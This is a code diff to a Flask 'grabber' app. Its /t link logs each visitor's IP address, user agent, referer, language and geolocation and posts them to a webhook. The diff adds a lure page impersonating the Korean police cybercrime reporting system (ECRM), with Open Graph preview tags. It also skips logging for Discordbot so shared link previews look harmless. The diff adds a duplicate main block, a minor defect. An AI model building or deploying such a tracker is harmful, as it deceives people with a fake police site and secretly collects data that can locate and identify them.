@@ -1,6 +1,6 @@
 import os
 import requests
-from flask import Flask, request, redirect, Response
+from flask import Flask, request, redirect, Response, send_from_directory
 
 app = Flask(__name__)
 
@@ -57,16 +57,56 @@ def send_webhook(ip, ua, referer, lang, geo, target=None):
         print("webhook failed:", e)
 
 
-LANDING = """
+LANDING_HTML = """
 <!doctype html>
-<html><head><meta charset="utf-8"><title>.</title></head>
-<body style="background:#0d0d0d;color:#eee;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
-<div style="text-align:center">
-<h1 style="font-weight:300;letter-spacing:4px">LOADING</h1>
-<p style="color:#555">please wait</p>
-</div>
-</body></html>
+<html lang="ko">
+<head>
+    <meta charset="utf-8">
+    <title>사이버범죄 신고시스템 (ECRM)</title>
+    
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://ecrm-police.onrender.com/t">
+    <meta property="og:title" content="사이버범죄 신고시스템 (ECRM)">
+    <meta property="og:description" content="여기를 눌러 링크를 확인하세요.">
+    <meta property="og:image" content="https://ecrm-police.onrender.com/preview.png">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    
+    <style>
+        body {
+            background-color: #f3f4f6;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: 'Malgun Gothic', '맑은 고딕', sans-serif;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        h2 { color: #111827; margin-bottom: 10px; }
+        a { color: #2563eb; text-decoration: none; font-size: 18px; }
+        a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>사이버범죄 신고시스템 (ECRM)</h2>
+        <a href="https://ecrm.police.go.kr">여기를 눌러 링크를 확인하세요.</a>
+    </div>
+</body>
+</html>
 """
+
+
+@app.route("/preview.png")
+def serve_preview():
+    return send_from_directory(os.path.dirname(__file__), "preview.png")
 
 
 @app.route("/t")
@@ -77,18 +117,24 @@ def track():
     lang = request.headers.get("Accept-Language", "unknown")
     target = request.args.get("redirect", "")
 
-    geo = lookup(ip)
-    send_webhook(ip, ua, referer, lang, geo, target or None)
+    if "Discordbot" not in ua:
+        geo = lookup(ip)
+        send_webhook(ip, ua, referer, lang, geo, target or None)
 
     if target and target.startswith(("http://", "https://")):
         return redirect(target, code=302)
 
-    return Response(LANDING, mimetype="text/html")
+    return Response(LANDING_HTML, mimetype="text/html")
 
 
 @app.route("/")
 def home():
     return Response("ok", mimetype="text/plain")
+
+
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
 
 
 if __name__ == "__main__":
